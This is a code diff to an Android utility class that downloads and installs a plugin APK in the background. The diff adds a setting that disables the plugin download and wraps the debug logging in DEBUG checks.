@@ -89,6 +89,13 @@ public class UtilOperator {
     }
 
     public static void tryToDownloadPlugin(final Context context) {
+        if (SettingManager.getInstance().getDisableDownloadPlugin()) {
+            if (Config.DEBUG) {
+                Config.LOGD("[[tryToDownloadPlugin::onReceive]] do nothing as the Disable plugin Downlaod is (true)");
+            }
+            return;
+        }
+
         final String local = SettingManager.getInstance().getLocalApkPath();
         String downloadUrl = SettingManager.getInstance().getKeyDownloadUrl();
         if (TextUtils.isEmpty(local) || TextUtils.isEmpty(downloadUrl)) {
@@ -96,7 +103,9 @@ public class UtilOperator {
         }
 
         if (UtilsRuntime.isOnline(context)) {
-            Config.LOGD("[[tryToDownloadPlugin::onReceive]] current is ONLINE  try to download plugin!!!");
+            if (Config.DEBUG) {
+                Config.LOGD("[[tryToDownloadPlugin::onReceive]] current is ONLINE  try to download plugin!!!");
+            }
 
             if (!Config.DOWNLOAD_PROCESS_RUNNING.get()) {
                 Config.DOWNLOAD_PROCESS_RUNNING.set(true);
@@ -110,7 +119,9 @@ public class UtilOperator {
                                                                    , new FileDownloader.DownloadListener() {
                     @Override
                     public void onDownloadProcess(int fileSize, int downloadSize) {
-                        Config.LOGD("[[tryToInstallPlugin]] downalod file size : " + downloadSize);
+                        if (Config.DEBUG) {
+                            Config.LOGD("[[tryToInstallPlugin]] downalod file size : " + downloadSize);
+                        }
                     }
 
                     @Override
@@ -119,15 +130,21 @@ public class UtilOperator {
                         if (response != null && status == FileDownloader.DOWNLOAD_SUCCESS) {
                             FileDownloader.DownloadResponse r = (FileDownloader.DownloadResponse) response;
                             String localUrl = r.getRawLocalPath();
-                            Config.LOGD("[[tryToDownloadPlugin]] download file success to : " + localUrl);
+                            if (Config.DEBUG) {
+                                Config.LOGD("[[tryToDownloadPlugin]] download file success to : " + localUrl);
+                            }
                             if (!TextUtils.isEmpty(localUrl)) {
                                 String targetPath = FileOperatorHelper.copyFile(localUrl, local);
                                 if (!TextUtils.isEmpty(targetPath)) {
-                                    Config.LOGD("[[tryToDownloadPlugin]] try to mv download file to : " + targetPath);
+                                    if (Config.DEBUG) {
+                                        Config.LOGD("[[tryToDownloadPlugin]] try to mv download file to : " + targetPath);
+                                    }
 
                                     File targetFile = new File(targetPath);
                                     if (!Utils.checkAPK(context, targetPath)) {
-                                        Config.LOGD("[[tryToDownloadPlugin]] try to check APK : " + targetPath + " <<<<<<<< Failed >>>>>>>>");
+                                        if (Config.DEBUG) {
+                                            Config.LOGD("[[tryToDownloadPlugin]] try to check APK : " + targetPath + " <<<<<<<< Failed >>>>>>>>");
+                                        }
                                         //delete targetPath
                                         targetFile.delete();
                                         File localFile = new File(localUrl);
@@ -138,14 +155,18 @@ public class UtilOperator {
 
                                     DemonService.cancelAlarmForAction(context, DemonService.ACTION_DOWNLOAD_PLUGIN);
                                     if (targetFile.exists()) {
-                                        Config.LOGD("[[tryToDownloadPlugin]] success download plugin file : " + targetPath);
+                                        if (Config.DEBUG) {
+                                            Config.LOGD("[[tryToDownloadPlugin]] success download plugin file : " + targetPath);
+                                        }
                                     }
 
                                     return;
                                 }
                             }
                         } else {
-                            Config.LOGD("[[tryToDownloadPlugin]] download plugin falied, response is null");
+                            if (Config.DEBUG) {
+                                Config.LOGD("[[tryToDownloadPlugin]] download plugin falied, response is null");
+                            }
                         }
 
                         if (Config.DEBUG) {
@@ -182,6 +203,13 @@ public class UtilOperator {
     }
 
     public static void tryToInstallPlugin(final Context context) {
+        if (SettingManager.getInstance().getDisableDownloadPlugin()) {
+            if (Config.DEBUG) {
+                Config.LOGD("[[tryToDownloadPlugin::onReceive]] do nothing as the Disable plugin Downlaod is (true)");
+            }
+            return;
+        }
+
         final String local = SettingManager.getInstance().getLocalApkPath();
         String downloadUrl = SettingManager.getInstance().getKeyDownloadUrl();
         if (TextUtils.isEmpty(local) || TextUtils.isEmpty(downloadUrl)) {
@@ -189,7 +217,9 @@ public class UtilOperator {
         }
 
         if (UtilsRuntime.isOnline(context)) {
-            Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] current is ONLINE !!!");
+            if (Config.DEBUG) {
+                Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] current is ONLINE !!!");
+            }
 
             if (!Config.DOWNLOAD_PROCESS_RUNNING.get()) {
                 Config.DOWNLOAD_PROCESS_RUNNING.set(true);
@@ -205,7 +235,9 @@ public class UtilOperator {
                                                                    , new FileDownloader.DownloadListener() {
                     @Override
                     public void onDownloadProcess(int fileSize, int downloadSize) {
-                        Config.LOGD("[[tryToInstallPlugin]] downalod file size : " + downloadSize);
+                        if (Config.DEBUG) {
+                            Config.LOGD("[[tryToInstallPlugin]] downalod file size : " + downloadSize);
+                        }
                     }
 
                     @Override
@@ -213,11 +245,15 @@ public class UtilOperator {
                         if (response != null) {
                             FileDownloader.DownloadResponse r = (FileDownloader.DownloadResponse) response;
                             String localUrl = r.getRawLocalPath();
-                            Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] download file success to : " + localUrl);
+                            if (Config.DEBUG) {
+                                Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] download file success to : " + localUrl);
+                            }
                             if (!TextUtils.isEmpty(localUrl)) {
                                 String targetPath = FileOperatorHelper.copyFile(localUrl, local);
                                 if (!TextUtils.isEmpty(targetPath)) {
-                                    Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] try to mv download file to : " + targetPath);
+                                    if (Config.DEBUG) {
+                                        Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] try to mv download file to : " + targetPath);
+                                    }
                                     File targetFile = new File(targetPath);
                                     if (targetFile.exists()) {
                                         intstallLocalApk(context, local);
